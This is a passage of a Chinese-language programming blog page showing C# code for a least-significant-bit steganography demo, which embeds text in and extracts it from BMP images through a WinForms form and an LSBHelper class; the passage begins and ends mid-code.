定义全局变量</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> fileName<span class="token punctuation">;</span>        <span class="token keyword">private</span> MemoryStream memorystream <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> info <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> msg <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 构造函数</span>        <span class="token keyword">public</span> <span class="token function">InfoExtractionFrm</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">InitializeComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 初始化展示界面</span>            <span class="token function">Form_Init</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 界面设置操作</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 界面设置操作</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="flag"></span>        <span class="token comment" spellcheck="true">/// 0:初始化</span>        <span class="token comment" spellcheck="true">/// 1:提取之后</span>        <span class="token comment" spellcheck="true">/// &lt;/param></span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">Form_Init</span><span class="token punctuation">(</span><span class="token keyword">int</span> flag<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 设置界面显示位置</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>StartPosition <span class="token operator">=</span> FormStartPosition<span class="token punctuation">.</span>CenterScreen<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 设置PictureBox控件</span>                pBoxDisplay<span class="token punctuation">.</span>SizeMode <span class="token operator">=</span> PictureBoxSizeMode<span class="token punctuation">.</span>StretchImage<span class="token punctuation">;</span>                pBoxDisplay<span class="token punctuation">.</span>ImageLocation <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 设置RichTextBox控件</span>                rtbInfo<span class="token punctuation">.</span><span class="token function">Clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                rtbInfo<span class="token punctuation">.</span>ReadOnly <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 设置Button控件</span>                btnLoadImage<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>                btnExtractInfo<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 设置RichTextBox控件</span>                rtbInfo<span class="token punctuation">.</span><span class="token function">Clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 设置Button控件</span>                btnLoadImage<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>                btnExtractInfo<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 加载图片</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnLoadImage_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">Form_Init</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 设置打开对话框的标题</span>            openImageDialog<span class="token punctuation">.</span>Title <span class="token operator">=</span> <span class="token string">"请选择一张已嵌入信息的位图"</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 对文件格式进行筛选</span>            openImageDialog<span class="token punctuation">.</span>Filter <span class="token operator">=</span> <span class="token string">"bmp | *.bmp;*.BMP"</span><span class="token punctuation">;</span>            openImageDialog<span class="token punctuation">.</span>FileName <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>openImageDialog<span class="token punctuation">.</span><span class="token function">ShowDialog</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> DialogResult<span class="token punctuation">.</span>OK<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 存储打开文件的全文件名</span>                fileName <span class="token operator">=</span> openImageDialog<span class="token punctuation">.</span>FileName<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 设置显示图片的样式</span>                pBoxDisplay<span class="token punctuation">.</span>SizeMode <span class="token operator">=</span> PictureBoxSizeMode<span class="token punctuation">.</span>StretchImage<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 加载要显示的图片</span>                pBoxDisplay<span class="token punctuation">.</span>ImageLocation <span class="token operator">=</span> fileName<span class="token punctuation">;</span>                <span class="token function">Form_Init</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 提取信息</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnExtractInfo_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 图片是否加载</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">.</span><span class="token function">IsNullOrWhiteSpace</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token string">"请选嵌入文字的位图"</span><span class="token punctuation">,</span> <span class="token string">"提示"</span><span class="token punctuation">,</span> MessageBoxButtons<span class="token punctuation">.</span>OK<span class="token punctuation">,</span> MessageBoxIcon<span class="token punctuation">.</span>Information<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token keyword">try</span>                <span class="token punctuation">{</span>                    LSBHelper lsb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LSBHelper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// 将图像存入内存流中</span>                    <span class="token keyword">using</span> <span class="token punctuation">(</span>FileStream fileReadStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileStream</span><span class="token punctuation">(</span>fileName<span class="token punctuation">,</span> FileMode<span class="token punctuation">.</span>Open<span class="token punctuation">,</span> FileAccess<span class="token punctuation">.</span>Read<span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        <span class="token keyword">using</span> <span class="token punctuation">(</span>BinaryReader br <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BinaryReader</span><span class="token punctuation">(</span>fileReadStream<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token punctuation">{</span>                            <span class="token keyword">byte</span> write<span class="token punctuation">;</span>                            memorystream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MemoryStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> fileReadStream<span class="token punctuation">.</span>Length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                            <span class="token punctuation">{</span>                                write <span class="token operator">=</span> br<span class="token punctuation">.</span><span class="token function">ReadByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                memorystream<span class="token punctuation">.</span><span class="token function">WriteByte</span><span class="token punctuation">(</span>write<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            <span class="token comment" spellcheck="true">// 回位操作</span>                            memorystream<span class="token punctuation">.</span>Position <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                    <span class="token comment" spellcheck="true">// 信息提取</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>lsb<span class="token punctuation">.</span><span class="token function">ExtractInfo</span><span class="token punctuation">(</span>memorystream<span class="token punctuation">,</span> <span class="token keyword">out</span> info<span class="token punctuation">,</span> <span class="token keyword">out</span> msg<span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        <span class="token comment" spellcheck="true">// 将提取到的信息展示在文本控件中</span>                        rtbInfo<span class="token punctuation">.</span>Text <span class="token operator">=</span> info<span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">else</span>                    <span class="token punctuation">{</span>                        MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> <span class="token string">"警告"</span><span class="token punctuation">,</span> MessageBoxButtons<span class="token punctuation">.</span>OK<span class="token punctuation">,</span> MessageBoxIcon<span class="token punctuation">.</span>Warning<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span>ex<span class="token punctuation">.</span>Message<span class="token punctuation">,</span> <span class="token string">"警告"</span><span class="token punctuation">,</span> MessageBoxButtons<span class="token punctuation">.</span>OK<span class="token punctuation">,</span> MessageBoxIcon<span class="token punctuation">.</span>Warning<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">finally</span>                <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">// 释放占用的资源</span>                    memorystream<span class="token punctuation">.</span><span class="token function">Dispose</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>LSBHelper代码</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>IO<span class="token punctuation">;</span><span class="token keyword">namespace</span> LSBAlgorithmDemo<span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LSBHelper</span>    <span class="token punctuation">{</span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 定义全局变量</span>        FileStream fileReadStream <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        MemoryStream memStream <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        BinaryReader br <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 用于判断图片是否为Bitmap格式</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 用于判断图片是否为Bitmap格式</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="imgFormat">图片前几个字节&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>返回判断结果&lt;/returns></span>        <span class="token keyword">private</span> <span class="token keyword">bool</span> <span class="token function">IsBitmap</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> imgFormat<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 判断类型表示字节是否为2</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>imgFormat<span class="token punctuation">.</span>Length <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 判断标识字节是否为：42 4d</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>imgFormat<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x42</span> <span class="token operator">&amp;&amp;</span> imgFormat<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0x4d</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">// 是Bitmap</span>                    <span class="token keyword">return</span> <span class="token keyword">true</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span>                <span class="token punctuation">{</span>                    <span class="token keyword">return</span> <span class="token keyword">false</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token keyword">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 判断文本信息能否写入图片中</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 判断文本信息能否写入图片中</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="streamSize">图片流的字节个数&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;param name="infoSize">文本信息的字符个数&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>返回判断结果&lt;/returns></span>        <span class="token keyword">private</span> <span class="token keyword">bool</span> <span class="token function">CanEmbed</span><span class="token punctuation">(</span><span class="token keyword">long</span> streamSize<span class="token punctuation">,</span> <span class="token keyword">long</span> infoSize<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>streamSize <span class="token operator">&lt;</span> <span class="token punctuation">(</span>infoSize <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token number">54</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token keyword">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token keyword">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 判断指定文件是否存在</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 判断指定文件是否存在</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="fullFileName">文件全名称&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>返回判断结果&lt;/returns></span>        <span class="token keyword">private</span> <span class="token keyword">bool</span> <span class="token function">IsFileExists</span><span class="token punctuation">(</span><span class="token keyword">string</span> fullFileName<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> File<span class="token punctuation">.</span><span class="token function">Exists</span><span class="token punctuation">(</span>fullFileName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 判断图像中是否写入信息</span>        <span class="token keyword">private</span> <span class="token keyword">bool</span> <span class="token function">IsEmabed</span><span class="token punctuation">(</span>MemoryStream memorystream<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 复位</span>            memorystream<span class="token punctuation">.</span>Position <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            memorystream<span class="token punctuation">.</span><span class="token function">Seek</span><span class="token punctuation">(</span>54L<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">byte</span> reader<span class="token punctuation">;</span>            <span class="token keyword">char</span> ch<span class="token punctuation">;</span>            <span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> state <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>index <span class="token operator">=</span> memorystream<span class="token punctuation">.</span><span class="token function">ReadByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> index <span class="token operator">!=</span> memorystream<span class="token punctuation">.</span>Length<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                temp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    reader <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">ToByte</span><span class="token punctuation">(</span>memorystream<span class="token punctuation">.</span><span class="token function">ReadByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    temp <span class="token operator">+</span><span class="token operator">=</span> <span class="token punctuation">(</span>reader <span class="token operator">&amp;</span> <span class="token number">0x01</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> k<span class="token punctuation">;</span>                <span class="token punctuation">}</span>                ch <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">ToChar</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>ch <span class="token operator">==</span> <span class="token string">'#'</span><span class="token punctuation">)</span>                    state<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>state <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token keyword">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token keyword">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 将待写入图片的信息转成</span><span class="token string">"# + info + #"</span>的格式并储存在tempChs字符数组中        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 将待写入图片的信息转成"# + info + #"的格式并储存在tempChs字符数组中</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="info">&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;returns>&lt;/returns></span>        <span class="token keyword">private</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">GetTempChsFromInfo</span><span class="token punctuation">(</span><span class="token keyword">string</span> info<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 将文本信息转成Unicode字符值并存储在char数组中</span>            <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> infoToChs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">char</span><span class="token punctuation">[</span>info<span class="token punctuation">.</span>Length<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> info<span class="token punctuation">.</span>Length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                infoToChs<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">ToChar</span><span class="token punctuation">(</span>info<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 将待写入图片的信息转成指定格式并储存在tempChs字符数组中</span>            <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> tempChs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">char</span><span class="token punctuation">[</span><span class="token punctuation">(</span>info<span class="token punctuation">.</span>Length <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 前导符“#”：16位</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> n <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> n<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                tempChs<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">ToChar</span><span class="token punctuation">(</span><span class="token number">0x0001</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token string">'#'</span> <span class="token operator">></span><span class="token operator">></span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 原主要信息</span>            <span class="token keyword">int</span> k<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>k <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> infoToChs<span class="token punctuation">.</span>Length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> n <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> n<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    tempChs<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> k <span class="token operator">+</span> n<span class="token punctuation">]</span> <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">ToChar</span><span class="token punctuation">(</span><span class="token number">0x0001</span> <span class="token operator">&amp;</span> infoToChs<span class="token punctuation">[</span>k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">></span><span class="token operator">></span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 后导符“#”：16位</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> n <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> n<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                tempChs<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> k <span class="token operator">+</span> n<span class="token punctuation">]</span> <span class="token operator">=</span> Convert<span class="token punctuation">.</span><span class="token function">ToChar</span><span class="token punctuation">(</span><span class="token number">0x0001</span> <span class="token operator">&amp;</span> <span class="token string">'#'</span> <span class="token operator">></span><span class="token operator">></span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> tempChs<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 向Bitmap中嵌入信息</span>        <span class="token keyword">public</span> <span class="token keyword">bool</span> <span class="token function">EmbedInfo</span><span class="token punctuation">(</span><span class="token keyword">string</span> fullFileName<span class="token punctuation">,</span> <span class="token keyword">string</span> info<span class="token punctuation">,</span> <span class="token keyword">out</span> <span class="token keyword">string</span> msg<span class="token punctuation">,</span> <span class="token keyword">out</span> MemoryStream memory<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 判断指定图片是否存在</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">IsFileExists</span><span class="token punctuation">(</span>fullFileName<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                msg <span class="token operator">=</span> <span class="token string">"请确认指定的图片是否存在"</span><span class="token punctuation">;</span>                memory <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token keyword">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">try</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 得到图片的字节流读取器</span>                fileReadStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileStream</span><span class="token punctuation">(</span>fullFileName<span class="token punctuation">,</span> FileMode<span class="token punctuation">.</span>Open<span class="token punctuation">,</span> FileAccess<span class="token punctuation">.</span>Read<span class="token punctuation">)</span><span class="token punctuation">;</span>                br <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BinaryReader</span><span class="token punctuation">(</span>fileReadStream<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 读取图片的标识符</span>                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> imgFormat <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                imgFormat<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> br<span class="token punctuation">.</span><span class="token function">ReadByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                imgFormat<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> br<span class="token punctuation">.</span><span class="token function">ReadByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                br<span class="token punctuation">.</span>BaseStream<span class="token punctuation">.</span>Position <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 判断指定图片是否为Bitmap格式</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">IsBitmap</span><span class="token punctuation">(</span>imgFormat<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    msg <span class="token operator">=</span> <span class="token string">"请选择Bitmap格式的图片"</span><span class="token punctuation">;</span>                    memory <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span> <span class="token keyword">false</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">// 判断指定图片是否能够写下信息</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">CanEmbed</span><span class="token punctuation">(</span>fileReadStream<span class="token punctuation">.</span>Length<span class="token punctuation">,</span> info<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    msg <span class="token operator">=</span> <span class="token string">"该图片无法写下指定的全部信息，请选择更大尺寸的Bitmap图片"</span><span class="token punctuation">;</span>                    memory <span class="token operator">=</span> <span class="token 